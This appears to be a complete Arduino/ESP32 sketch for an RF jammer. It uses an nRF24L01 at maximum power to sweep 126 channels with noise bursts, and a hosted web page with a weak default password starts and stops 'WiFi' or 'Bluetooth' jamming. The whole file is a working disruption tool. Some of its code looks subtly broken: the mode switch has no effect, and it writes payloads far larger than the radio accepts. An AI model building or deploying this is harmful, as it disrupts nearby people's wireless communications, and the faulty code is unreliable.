#include <SPI.h>
#include <nRF24L01.h>
#include <RF24.h>
#include <BluetoothSerial.h>
#include <WiFi.h>
#include <WebServer.h>

RF24 radio(5, 27);
BluetoothSerial SerialBT;
const byte address[6] = "00001";
const int maxChannels = 126;
int transmissionDuration = 1000;
bool jammingActive = false;
String jamMode = "WiFi"; // Default mode
WebServer server(80);

void setup() {
    radio.begin();
    radio.setDataRate(RF24_250KBPS);
    radio.setPALevel(RF24_PA_MAX);
    radio.openWritingPipe(address);
    radio.stopListening();
    randomSeed(analogRead(0));
    delay(1000);
    
    WiFi.mode(WIFI_AP);
    WiFi.softAP("ESP32_Jammer_AP", "password");

    server.on("/", HTTP_GET, handleRoot);
    server.on("/start", HTTP_GET, startJamming);
    server.on("/stop", HTTP_GET, stopJamming);
    server.on("/setmode", HTTP_GET, setMode);
    server.begin();
}

void loop() {
    server.handleClient();
    if (jammingActive) {
        for (int channel = 0; channel < maxChannels; channel++) {
            radio.setChannel(channel);
            jamChannel(transmissionDuration);
        }
    }
}

void handleRoot() {
    String html = "<html><body><h1>ESP32 Jammer Control</h1>"
                  "<h2>Current Mode: " + jamMode + "</h2>"
                  "<h3>Select Jamming Mode:</h3>"
                  "<a href='/setmode?mode=WiFi'>WiFi Jammer</a><br>"
                  "<a href='/setmode?mode=Bluetooth'>Bluetooth Jammer</a><br>"
                  "<h3>Control Jamming:</h3>"
                  "<a href='/start'>Start Jamming</a><br>"
                  "<a href='/stop'>Stop Jamming</a></body></html>";
    server.send(200, "text/html", html);
}

void setMode() {
    if (server.arg("mode") == "WiFi") {
        jamMode = "WiFi";
        server.send(200, "text/plain", "Mode set to WiFi.");
    } else if (server.arg("mode") == "Bluetooth") {
        jamMode = "Bluetooth";
        server.send(200, "text/plain", "Mode set to Bluetooth.");
    } else {
        server.send(400, "text/plain", "Invalid mode.");
    }
}

void startJamming() {
    jammingActive = true;
    server.send(200, "text/plain", "Jamming started.");
}

void stopJamming() {
    jammingActive = false;
    server.send(200, "text/plain", "Jamming stopped.");
}

void jamChannel(int duration) {
    unsigned long startTime = millis();

    while (millis() - startTime < duration) {
        int length = random(150, 300);
        char noiseData[300];

        for (int i = 0; i < length; i++) {
            noiseData[i] = (char)(127.5 * (1 + sin((2 * PI * i / length) + random(0, 360) * (PI / 180))));
        }

        for (int j = 0; j < 5; j++) {
            radio.write(noiseData, length);
        }

        delayMicroseconds(10);
    }
}
